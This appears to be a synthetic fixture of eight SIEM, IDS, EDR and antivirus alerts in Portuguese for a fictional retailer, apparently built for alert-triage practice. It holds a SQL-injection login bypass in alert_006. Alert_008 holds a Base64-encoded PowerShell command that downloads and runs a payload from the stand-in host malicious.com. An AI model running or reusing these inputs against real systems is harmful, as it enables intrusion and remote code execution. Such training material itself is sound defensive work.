@@ -1,0 +1,131 @@
+[
+  {
+    "id": "alert_001",
+    "timestamp": "2026-06-19T08:15:00Z",
+    "source": "SIEM",
+    "rule_name": "Multiple Failed Logins Followed by Success",
+    "asset": "Portal de Vendas (servidor web)",
+    "asset_criticality": 4,
+    "description": "50 tentativas de login falhas em 2 minutos, seguidas de 1 login bem-sucedido.",
+    "indicators": {
+      "ip_origem": "203.0.113.45",
+      "pais_origem": "Nigéria",
+      "usuario_afetado": "carlos.oliveira"
+    },
+    "estimated_impact": 7,
+    "alert_confidence": 7
+  },
+  {
+    "id": "alert_002",
+    "timestamp": "2026-06-19T08:20:00Z",
+    "source": "IDS",
+    "rule_name": "Port Scan Detected",
+    "asset": "Firewall de Borda",
+    "asset_criticality": 7,
+    "description": "Scan de portas detectado a partir de IP externo. Portas 22, 80, 443, 3389 foram varridas.",
+    "indicators": {
+      "ip_origem": "198.51.100.22",
+      "pais_origem": "EUA",
+      "portas_varridas": [22, 80, 443, 3389]
+    },
+    "estimated_impact": 2,
+    "alert_confidence": 2
+  },
+  {
+    "id": "alert_003",
+    "timestamp": "2026-06-19T08:25:00Z",
+    "source": "EDR",
+    "rule_name": "Suspicious Process Outbound Connection",
+    "asset": "Estação de Trabalho - Vendedor",
+    "asset_criticality": 2,
+    "description": "Processo desconhecido 'update.exe' estabelecendo conexão de saída para IP na Rússia.",
+    "indicators": {
+      "ip_destino": "5.183.101.45",
+      "pais_destino": "Rússia",
+      "processo": "update.exe",
+      "pid": 4521
+    },
+    "estimated_impact": 7,
+    "alert_confidence": 8
+  },
+  {
+    "id": "alert_004",
+    "timestamp": "2026-06-19T08:30:00Z",
+    "source": "Antivirus",
+    "rule_name": "Ransomware Detected",
+    "asset": "Servidor de Banco de Dados de Produção",
+    "asset_criticality": 10,
+    "description": "Antivírus detectou comportamento de ransomware: criptografia em massa de arquivos .mdf e .ldf.",
+    "indicators": {
+      "arquivo_detectado": "nota_resgate.txt",
+      "extensoes_afetadas": [".mdf", ".ldf"],
+      "processo": "sqlservr.exe"
+    },
+    "estimated_impact": 10,
+    "alert_confidence": 10
+  },
+  {
+    "id": "alert_005",
+    "timestamp": "2026-06-19T08:35:00Z",
+    "source": "SIEM",
+    "rule_name": "Inbox Rule Created - Email Forwarding",
+    "asset": "Caixa Postal do CFO",
+    "asset_criticality": 10,
+    "description": "Regra de redirecionamento de e-mails criada na caixa postal do CFO. E-mails sendo encaminhados para endereço externo.",
+    "indicators": {
+      "usuario_afetado": "ricardo.mendes@techvarejo.com.br",
+      "email_destino": "suspeito@protonmail.com",
+      "regra_criada": "ForwardAll"
+    },
+    "estimated_impact": 7,
+    "alert_confidence": 7
+  },
+  {
+    "id": "alert_006",
+    "timestamp": "2026-06-19T08:40:00Z",
+    "source": "IDS",
+    "rule_name": "SQL Injection Attempt",
+    "asset": "Servidor Web de Homologação",
+    "asset_criticality": 4,
+    "description": "Tentativa de SQL injection detectada em formulário de login do ambiente de homologação.",
+    "indicators": {
+      "ip_origem": "185.220.101.34",
+      "pais_origem": "Alemanha",
+      "payload": "' OR '1'='1"
+    },
+    "estimated_impact": 4,
+    "alert_confidence": 4
+  },
+  {
+    "id": "alert_007",
+    "timestamp": "2026-06-19T08:45:00Z",
+    "source": "Antivirus",
+    "rule_name": "Malicious File Blocked",
+    "asset": "Estação de Trabalho - Estagiário RH",
+    "asset_criticality": 2,
+    "description": "Antivírus bloqueou anexo de e-mail contendo malware. Arquivo colocado em quarentena.",
+    "indicators": {
+      "arquivo": "fatura_atrasada.exe",
+      "hash_md5": "d41d8cd98f00b204e9800998ecf8427e",
+      "usuario_afetado": "estagiario.rh@techvarejo.com.br"
+    },
+    "estimated_impact": 4,
+    "alert_confidence": 2
+  },
+  {
+    "id": "alert_008",
+    "timestamp": "2026-06-19T08:50:00Z",
+    "source": "EDR",
+    "rule_name": "Encoded PowerShell Execution",
+    "asset": "Controlador de Domínio Principal",
+    "asset_criticality": 10,
+    "description": "PowerShell com comando codificado em Base64 executado no controlador de domínio.",
+    "indicators": {
+      "comando_base64": "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+      "usuario_executor": "svc_backup",
+      "pid": 8912
+    },
+    "estimated_impact": 7,
+    "alert_confidence": 7
+  }
+]
